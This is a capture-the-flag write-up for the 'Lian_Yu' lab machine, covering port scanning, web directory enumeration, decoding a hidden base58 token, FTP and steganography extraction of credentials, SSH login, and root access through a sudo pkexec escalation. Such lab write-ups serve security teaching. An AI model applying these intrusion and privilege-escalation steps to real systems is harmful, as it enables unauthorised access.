# Lian_yu

## 1. Port Scanning & Enumeration
### 1.1 Port Scanning
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.185.218
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 04:00 EDT
Nmap scan report for 10.10.185.218
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34042/udp   status
|   100024  1          40662/tcp   status
|   100024  1          41729/tcp6  status
|_  100024  1          46517/udp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.45 seconds

```

No `ftp` anon login. That's good. Nothing out of ordinary.

### 1.2 Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/***a**               (Status: 301) [Size: 236] [--> http://10.10.185.218/***a**/]
```

Interesting. Looking at the source code, we get:

`<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> *****a**e</style></h2>
`

It also hints at 'find a way'. This means more enumeration :D

```                          
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218/***a** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q

/21**                 (Status: 301) [Size: 241] [--> http://10.10.185.218/***a**/21**]
```

Looking at the source code again, we get:

`<!-- you can avail your .ticket here but how?   -->
`

Time for another round of web enumeration!

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.185.218/***a**/21** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -q
/g****_*****.ticket   (Status: 200) [Size: 71]

```

Ey, viola!

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yh******
```

### 1.3 Decoding

Using [CyberChef](http://icyberchef.com/), I hoped to get some thing, but to no avail. It only says base64, but prints some garbage if we use it.

Having some previous blockchain experience, I remember that BTC usernames and something something uses base58. Trying that out, we get:

`!#th3****`

Using the `*****a**e` and the `!#th3****` as creds to ftp, we get in!

### 1.4 FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.185.218
Connected to 10.10.185.218.
220 (vsFTPd 3.0.2)
Name (10.10.185.218:kali): *****a**e
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get Leave_me_alone.png
...
ftp> get Queen's_Gambit.png
...
ftp> get aa.jpg
... 
```

### 1.5 File Exploration

```       
┌──(kali㉿kali)-[/tmp]
└─$ file Leave_me_alone.png 
Leave_me_alone.png: data
```

```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
```

Trying empty string did not work, but password as password did. Quite common, plus, I'd like to dodge as many stego challenges :D

Anyways, going in, we have two files

```
┌──(kali㉿kali)-[/tmp]
└─$ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, ****** learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

We get a username

```
┌──(kali㉿kali)-[/tmp]
└─$ cat shado     
*********
```

... did not work on the user we saw.

Tracing our steps back, we may have missed something important ... `ls -la` is always preferred over `ls`. I took note!

Here's the interesting file we missed:

```
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
```

Looking in it, we get a whole bunch of other users, and we just try them one by one :D

PS: You could use Hydra, but I feel that equal work.

## 2. Foothold

```
┌──(kali㉿kali)-[~]
└─$ ssh ****e@10.10.185.218
****e@10.10.185.218's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

****e@LianYu:~$ 
```

Get the user flag. Easy. Nothing else too interesting. Except ... the sudo permissions.

## 3. PrivEsc

Looking it up on [gtfobins](https://gtfobins.github.io/) we get `sudo pkexec /bin/bash` as the command to run. Ez

And ...

```
****e@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# cat /root/root.txt
                          Mission accomplished
...
```

We are done!
